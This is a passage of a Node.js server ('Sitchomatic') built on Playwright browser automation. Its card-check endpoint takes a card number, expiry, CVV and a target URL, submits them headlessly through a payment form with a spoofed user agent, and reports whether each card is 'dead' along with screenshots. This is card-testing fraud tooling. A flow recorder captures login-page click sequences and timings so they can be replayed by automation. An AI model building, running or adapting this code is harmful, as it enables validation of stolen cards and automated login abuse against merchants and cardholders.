app.post('/api/card-check', async (req, res) => {
  const { number, mm, yy, cvv, ppsrUrl, timeout = NAV_TIMEOUT } = req.body;
  if (!number || !mm || !yy || !cvv || !ppsrUrl) {
    return res.status(400).json({ error: 'Missing card fields or ppsrUrl' });
  }

  let browser;
  const shots = ['', '', '', ''];
  let outcome = 'dead';
  let note = 'Check did not complete';

  try {
    browser = await chromium.launch({ headless: true, args: BROWSER_ARGS });
    const context = await browser.newContext({
      viewport: { width: 1280, height: 800 },
      userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
      ignoreHTTPSErrors: true,
    });
    const page = await context.newPage();
    page.setDefaultTimeout(timeout);

    // Navigate to check page — if it fails, capture whatever the page shows
    // so the user has visual evidence of the failure mode.
    try {
      await page.goto(ppsrUrl, { waitUntil: 'domcontentloaded', timeout });
    } catch (navErr) {
      note = `Navigation failed: ${navErr.message.split('\n')[0]}`;
      const frame = await captureShot(page, 'SCR 1/4').catch(() => '');
      shots[0] = frame; shots[1] = frame; shots[2] = frame; shots[3] = frame;
      return res.json({ outcome: 'dead', note, shots });
    }
    await page.waitForTimeout(2000);
    await dismissCookiePopup(page);

    // Shot 1: page loaded, form visible
    shots[0] = await captureShot(page, 'SCR 1/4');

    // Fill card form
    const filled = await fillCardForm(page, number, mm, yy, cvv);
    if (!filled) {
      note = 'Could not find card number field on page';
    }

    // Shot 2: form filled with card details
    shots[1] = await captureShot(page, 'SCR 2/4');

    // Submit
    const clicked = await clickSubmit(page);
    if (!clicked) {
      await page.keyboard.press('Enter');
    }

    // Wait for response
    await page.waitForTimeout(2000);
    try {
      await page.waitForLoadState('networkidle', { timeout: POST_SUBMIT_WAIT });
    } catch {}
    await page.waitForTimeout(1000);
    await dismissCookiePopup(page);

    // Shot 3: first response after submit
    shots[2] = await captureShot(page, 'SCR 3/4');

    // Determine outcome
    const result = await determineCardOutcome(page);
    outcome = result.outcome;
    note = result.note;

    // Shot 4: final state
    shots[3] = await captureShot(page, 'SCR 4/4');

  } catch (err) {
    note = `Automation error: ${err.message}`;
    outcome = 'dead';
  } finally {
    if (browser) await browser.close().catch(() => {});
  }

  if (!res.headersSent) res.json({ outcome, note, shots });
});

// ── API: Flow Recorder ────────────────────────────────────────────────────────

/**
 * In-memory state for the active flow recording session.
 * Only one session may be active at a time.
 * @type {{ step: number, labels: string[], selectors: string[], status: string, error: string } | null}
 */
let flowSession = null;

/**
 * Waits for the user's next interaction inside the recording browser.
 * Returns { selector, ts } when the user clicks a page element, or
 * { done: true } when the user presses the "✓ Done" button in the overlay bar.
 *
 * Selector priority: id → input type → name → placeholder → data-testid →
 *   aria-label → button text → first class → tag name.
 *
 * @param {import('playwright').Page} page
 * @returns {Promise<{selector: string, ts: number}|{done: true}>}
 */
async function waitForRecordedEvent(page) {
  return page.evaluate(() => new Promise(resolve => {
    function sel(el) {
      if (!el || el.tagName === 'BODY') return 'body';
      const tag = el.tagName.toLowerCase();
      if (el.id && /^[a-zA-Z_]/.test(el.id)) return '#' + el.id;
      const type = el.getAttribute('type');
      if (type === 'email')    return 'input[type="email"]';
      if (type === 'password') return 'input[type="password"]';
      if (type === 'submit')   return tag + '[type="submit"]';
      const name = el.getAttribute('name');
      if (name) return tag + '[name="' + name + '"]';
      const ph = el.getAttribute('placeholder');
      if (ph) return tag + '[placeholder="' + ph.replace(/"/g, '\\"') + '"]';
      const tid = el.getAttribute('data-testid');
      if (tid) return '[data-testid="' + tid + '"]';
      const al = el.getAttribute('aria-label');
      if (al) return '[aria-label="' + al.replace(/"/g, '\\"') + '"]';
      if (tag === 'button') {
        const txt = (el.textContent || '').trim().slice(0, 40);
        if (txt) return 'button:has-text("' + txt.replace(/"/g, '\\"') + '")';
      }
      if (el.className && typeof el.className === 'string') {
        const c = el.className.trim().split(/\s+/)[0];
        if (c) return tag + '.' + c;
      }
      return tag;
    }
    function handler(e) {
      // "Done" button inside the overlay bar → signal end of recording
      const doneBtn = document.getElementById('_sitcho_done_btn');
      if (doneBtn && (e.target === doneBtn || doneBtn.contains(e.target))) {
        e.preventDefault();
        e.stopPropagation();
        document.removeEventListener('click', handler, true);
        resolve({ done: true });
        return;
      }
      // Other clicks inside the overlay bar are ignored (don't record them)
      const bar = document.getElementById('_sitcho_rec_bar');
      if (bar && bar.contains(e.target)) return;

      e.preventDefault();
      e.stopPropagation();
      document.removeEventListener('click', handler, true);
      resolve({ selector: sel(e.target), ts: Date.now() });
    }
    document.addEventListener('click', handler, true);
  }));
}

/**
 * Injects or updates the recording overlay bar inside the headed browser.
 * Shows how many clicks have been captured so far and a "✓ Done" button.
 * @param {import('playwright').Page} page
 * @param {number} count - Number of clicks captured so far.
 */
async function updateRecordingOverlay(page, count) {
  await page.evaluate((count) => {
    let bar = document.getElementById('_sitcho_rec_bar');
    if (!bar) {
      bar = document.createElement('div');
      bar.id = '_sitcho_rec_bar';
      bar.style.cssText = [
        'position:fixed', 'top:0', 'left:0', 'right:0', 'z-index:2147483647',
        'background:rgba(0,0,0,0.88)', 'color:#fff',
        'padding:8px 16px', 'font:14px/1.4 system-ui,sans-serif',
        'display:flex', 'align-items:center', 'gap:12px',
        'border-bottom:2px solid #30d5c8',
      ].join(';');
      document.body.prepend(bar);
    }
    const badge = count === 0
      ? '<span style="background:#30d5c8;color:#000;padding:2px 8px;border-radius:4px;font-weight:700;white-space:nowrap">READY</span>'
      : '<span style="background:#30d5c8;color:#000;padding:2px 8px;border-radius:4px;font-weight:700;white-space:nowrap">CLICK ' + count + '</span>';
    bar.innerHTML =
      badge +
      '<span style="flex:1">Click elements in order (cookie dismiss → email → password → submit + any extras). Press <strong>✓ Done</strong> when finished.</span>' +
      '<button id="_sitcho_done_btn" style="background:#34c759;color:#000;border:none;padding:5px 14px;border-radius:4px;font-weight:700;cursor:pointer;font-size:13px;white-space:nowrap">✓ Done</button>';
  }, count);
}

/**
 * GET /api/record-flow/status
 * Returns the current flow recording session state.
 * Response: { active: bool, count: number, selectors: string[], status: string, error: string }
 */
app.get('/api/record-flow/status', (req, res) => {
  if (!flowSession) return res.json({ active: false });
  res.json({
    active:    true,
    count:     flowSession.count || 0,
    selectors: flowSession.selectors,
    status:    flowSession.status,
    error:     flowSession.error || '',
  });
});

/**
 * POST /api/record-flow
 * Opens a headed (visible) Chromium browser on the login page and records an
 * unlimited number of user clicks until the user presses the "✓ Done" button
 * in the overlay bar. Each click's selector and timestamp are captured.
 *
 * After recording, delays between consecutive clicks are computed so the UI
 * can show timing analysis. The automation can use these delays to tune waits.
 *
 * Request body: { loginUrl: string }
 * Response:     { selectors: string[], delays: number[], count: number }
 *               or { error: string }
 */
app.post('/api/record-flow', async (req, res) => {
  const { loginUrl } = req.body;
  if (!loginUrl) return res.status(400).json({ error: 'Missing loginUrl' });
  if (flowSession && flowSession.status === 'recording') {
    return res.status(409).json({ error: 'A recording session is already active. Close the browser window first.' });
  }

  flowSession = { count: 0, selectors: [], delays: [], status: 'recording', error: '' };

  let browser;
  try {
    browser = await chromium.launch({ headless: false, args: ['--window-size=1280,800'] });
    const context = await browser.newContext({
      viewport: { width: 1280, height: 800 },
      ignoreHTTPSErrors: true,
    });
    const page = await context.newPage();

    // If the user manually closes the browser window, stop the recording loop
    // gracefully instead of throwing from the next waitForRecordedEvent call.
    let userClosedBrowser = false;
    page.on('close', () => { userClosedBrowser = true; });
    browser.on('disconnected', () => { userClosedBrowser = true; });

    await page.goto(loginUrl, { waitUntil: 'domcontentloaded', timeout: 30000 });
    await page.waitForTimeout(1500);

    // Inject initial overlay with Done button; no step limit
    await updateRecordingOverlay(page, 0);

    // Allow up to 10 minutes total for the user to complete their recording
    page.setDefaultTimeout(600000);

    const clicks = []; // { selector: string, ts: number }

    while (true) {
      if (userClosedBrowser) break;
      const event = await waitForRecordedEvent(page).catch(() => null);

      // null (timeout/error/window closed) or explicit done → stop recording
      if (userClosedBrowser || !event || event.done) break;

      clicks.push(event);
      flowSession.count     = clicks.length;
      flowSession.selectors = clicks.map(c => c.selector);

      // Update overlay badge to reflect the running click count
      await updateRecordingOverlay(page, clicks.length).catch(() => {});
    }

    // Compute ms delay between each pair of consecutive clicks.
    // These can be used to tune automation timing for this specific site.
    const delays = [];
    for (let i = 1; i < clicks.length; i++) {
      delays.push(clicks[i].ts - clicks[i - 1].ts);
    }
    flowSession.delays = delays;

    // Show completion summary in the headed browser before it auto-closes
    const avgDelay = delays.length
      ? Math.round(delays.reduce((a, b) => a + b, 0) / delays.length)
      : 0;
    if (userClosedBrowser) {
      flowSession.status = 'done';
      return res.json({ selectors: flowSession.selectors, delays, count: clicks.length, closed: true });
    }

    await page.evaluate(({ count, avgDelay }) => {
      const bar = document.getElementById('_sitcho_rec_bar');
      if (bar) {
        bar.style.cssText = bar.style.cssText.replace('#30d5c8', '#28a046')
          .replace('rgba(0,0,0,0.88)', 'rgba(52,199,89,0.95)');
        bar.style.background = 'rgba(52,199,89,0.95)';
        bar.style.color = '#000';
        bar.style.borderColor = '#28a046';
        bar.innerHTML =
          '<strong>✓ ' + count + ' click' + (count !== 1 ? 's' : '') + ' recorded!</strong>' +
          (avgDelay ? '  Avg delay between clicks: <strong>' + avgDelay + ' ms</strong>' : '') +
          '  You can close this window.';
      }
    }, { count: clicks.length, avgDelay }).catch(() => {});

    await page.waitForTimeout(2500).catch(() => {});

    flowSession.status = 'done';
    if (!res.headersSent) {
      res.json({ selectors: flowSession.selectors, delays, count: clicks.length });
    }

  } catch (err) {
    flowSession.status = 'error';
    flowSession.error  = err.message;
    if (!res.headersSent) res.status(500).json({ error: err.message });
  } finally {
    if (browser) await browser.close().catch(() => {});
  }
});

// ── Start ─────────────────────────────────────────────────────────────────────

app.listen(PORT, () => {
  console.log(`Sitchomatic server running at http://localhost:${PORT}`);
  console.log(`  Webapp:  http://localhost:${PORT}/`);
  console.log(`  API:     http://localhost:${PORT}/api/status`);
  console.log(`  Mode:    LIVE browser automation (Playwright Chromium)`);
});
